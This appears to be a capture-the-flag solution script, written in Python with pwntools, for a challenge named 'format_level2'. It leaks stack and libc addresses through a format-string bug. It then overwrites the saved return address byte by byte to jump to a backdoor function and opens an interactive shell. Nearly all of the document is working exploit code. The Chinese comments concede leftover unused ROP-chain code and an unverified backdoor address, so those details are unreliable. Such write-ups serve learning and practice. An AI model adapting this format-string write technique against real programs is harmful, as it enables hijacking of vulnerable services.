# format_level2

```py
from pwn import *
context.arch='i386'
p=remote("localhost",55128)
def talk(payload):
    p.sendlineafter("Your choice: ",'3')
    p.sendlineafter("Input what you want to talk: ",payload)
def attack(addr,value):
    payload=fmtstr_payload(7,{addr:value&0xff},write_size='byte')
    talk(payload)
    value>>=8
    payload=fmtstr_payload(7,{addr+1:value&0xff},write_size='byte')
    talk(payload)
    value>>=8
    payload=fmtstr_payload(7,{addr+2:value&0xff},write_size='byte')
    talk(payload)
    value>>=8
    payload=fmtstr_payload(7,{addr+3:value&0xff},write_size='byte')
    talk(payload)
#这些偏移都能在gdb里拿
#这里有很多不需要的代码，本来是想写rop chain的，但是写到崩溃才发现有个后门函数（似乎是0x08049317？没有保留题目，如果错了别打我）。历史总是惊人的相似
#不敢删，万一搞了什么东西出不来了就寄了。又没法验证
libc_offset=0xf7fbb580-0xf7dd7000
stack_offset=0xffffcdac-0xfffdd000
ret_offset=0xffffcdfc-0xfffdd000
edi_offset=0xffffce04-0xfffdd000
payload='%1$p,%4$p' #stack,libc
p.sendlineafter("Your choice: ",'3')
p.sendlineafter("Input what you want to talk: ",payload)
p.recvuntil("You said: \n")
content=p.recvline(keepends=False).split(b',')
stack=int(content[0],16)-stack_offset
libc=int(content[1],16)-libc_offset
ret=stack+ret_offset
edi=libc+edi_offset
system=libc+266240
sh=libc+1602360
ret_gadget=0x08049814
ret_addr=0x080496d1
inst_addr=0x8049678
dragon=0x0804c00c
attack(ret,0x08049317)
p.sendlineafter("Your choice: ",'4')
print(p.recvline())
p.interactive()
```